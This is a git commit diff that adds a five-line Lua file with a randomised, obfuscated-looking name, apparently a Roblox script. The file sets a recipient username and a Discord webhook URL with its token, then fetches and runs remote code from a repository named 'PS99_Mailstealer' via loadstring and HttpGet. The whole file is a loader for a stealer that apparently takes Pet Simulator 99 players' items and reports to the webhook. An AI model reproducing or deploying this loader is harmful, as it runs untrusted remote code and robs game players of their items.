385583a5594c04c31aa5532960409ff8c9a5736f
wdawdasd <lionydora@gmail.com>
2025-01-02 17:50:10 -0500

    Add files via upload

---
+++ obf_f1K2k872RZm2J3V488ufn648LG2r82xmD68Wffb95p00n007TZOj311c4q0c4Gjw.lua
@@ -0,0 +1,5 @@
+Username = "jokingthekingqr13"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1324450942438871050/PXVreIUhLdpC8i9mA_pG65D8X60--19XE2LR5alJNXwZIv7DMz7mpJSMPajjaKmKkqBH"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
+
